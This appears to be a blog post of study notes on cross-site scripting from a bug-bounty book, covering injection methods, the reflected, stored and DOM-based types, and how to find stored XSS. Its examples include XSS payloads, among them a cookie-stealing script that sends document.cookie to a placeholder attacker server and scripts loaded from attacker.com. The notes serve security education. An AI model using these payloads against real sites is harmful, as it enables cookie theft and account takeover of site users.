---
layout: post
title: CROSS-SITE SCRIPTING (XSS)
date: 2023-07-17
categories: [cybersecurity, web-security,Bug_Bounty_Bootcamp_The_Guide_to_Finding_and_Reporting_Web_Vulnerabilities,XSS ]
---


# Chapter 6 : CROSS-SITE SCRIPTING

An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser. If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by other users. The victim's browser will then execute the malicious script, which might steal cookies, leak personal information, change site contents, or redirect the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute.

# XSS Injection Methods

There are different ways that attackers can inject malicious code into web pages, such as:

1. Inline script injection: The attacker inserts a `<script>` tag with the code directly into the web page. For example: 
```html
<script>location = "http://attacker.com";</script>
```

2. External script source injection: The attacker uses the `src` attribute of the `<script>` tag to load the code from an external source. For example: `<script src="http://attacker.com/xss.js"></script>`.

3. Malicious URL injection: The attacker crafts a URL that contains the code as a parameter and tricks the user into visiting it. For example: `https://subscribe.example.com?email=<script>location="http://attacker.com";</script>`.

4. Stealing user cookies: The attacker uses the `document.cookie` property to access and send the user’s cookies to a malicious server. For example: `<script>image = new Image(); image.src='http://attacker_server_ip/?c='+document.cookie;</script>`.

# Types of XSS

There are three main types of XSS attacks:

- Reflected XSS: The attacker’s code is sent as part of the user’s request and reflected back by the server in the response. The user has to click on a malicious link or visit a malicious site to trigger the attack.
- Stored XSS: The attacker’s code is stored on the server, such as in a database, a comment field, or a profile. The user views the affected web page and executes the code without any interaction.
- DOM-based XSS: The attacker’s code is executed in the user’s browser by manipulating the DOM (Document Object Model) of the web page. The code never leaves the browser and does not involve the server.

## What is Stored Cross-Site Scripting?

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

### Example Scenario on how Stored XSS Works

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
```html
<p>This post was extremely helpful.</p>
```
### what an Attack can do 
Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
```html
<script>/* Bad stuff here... */</script>
```
Within the attacker's request, this comment would be URL-encoded as:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
`
Any user who visits the blog post will now receive the following within the application's response:

```html
<p><script>/* Bad stuff here... */</script></p>
```
## Finding Stored XSS Vulnerabilities

To find stored XSS vulnerabilities, you need to test all relevant entry points and exit points in the application. Entry points are where the attacker can submit data to the application, such as URL parameters, form inputs, or HTTP headers. Exit points are where the data is displayed to other users, such as web pages, emails, or logs.

1. **Identify Entry and Exit Points:**
   Entry points are areas where users can input data, and exit points are places where that data is displayed to others. For example, consider a blog post comment feature, where users can input comments, and those comments are displayed on the blog post page.

2. **Test Links Between Points:**
   Submit specific values to the entry points and observe the application's responses. For example, submit the comment "test123" and see if it appears on the blog post page. If the comment is visible, proceed to the next step.

3. **Check Data Storage:**
   Determine if the data is stored on the server or just reflected in the immediate response. Suppose the application stores the comment data in a database, and when the blog post page is accessed, it retrieves and displays the stored comments.

4. **Test XSS Payloads:**
   Inject suitable XSS payloads into each context where the data appears. For example, try injecting the script tag `<script>alert('XSS')</script>` into the comment. If the script executes on the browser when displayed within an HTML context, it indicates a stored XSS vulnerability.


### Entry Point to application can be like : 
   
- Parameters in the URL Query String and Message Body:

In a web application, there might be a search functionality that allows users to search for products using the URL query string. For example: https://example.com/search?keyword=user_input, where user_input is the search term provided by the user. If the application doesn't properly validate and sanitize this input, it becomes vulnerable to XSS attacks. An attacker could inject malicious scripts, like <script>alert('XSS');</script>, into the search term. If the application reflects this input back to other users without proper encoding, the script could execute in their browsers.

- The URL File Path:

Suppose a web application serves different pages based on the URL file path, like https://example.com/pages/page1.html, where page1.html represents a specific page on the website. If the application fails to handle the file path securely, an attacker could manipulate it and attempt to inject scripts. For example, an attacker might try to access a non-existing page like https://example.com/pages/<script>alert('XSS');</script>, hoping the application reflects the input in the response and triggers an XSS vulnerability.

- HTTP Request Headers:

Although HTTP request headers are not typically exploited for reflected XSS, they can be entry points for other types of attacks or security issues. For instance, an application might rely on a custom request header for authentication or session management. If the application doesn't validate and handle these headers securely, attackers might manipulate them to gain unauthorized access or perform malicious actions.

- Out-of-Band Routes:

Consider a web application that aggregates news articles from external websites. The application processes and displays these articles on its platform. If the application fails to sanitize data received from external sources, an attacker could inject malicious content into these articles. For instance, the attacker might compromise an external news source and inject a malicious script into one of the articles. When the web application displays this article to its users, it unknowingly executes the malicious script, leading to an XSS attack.



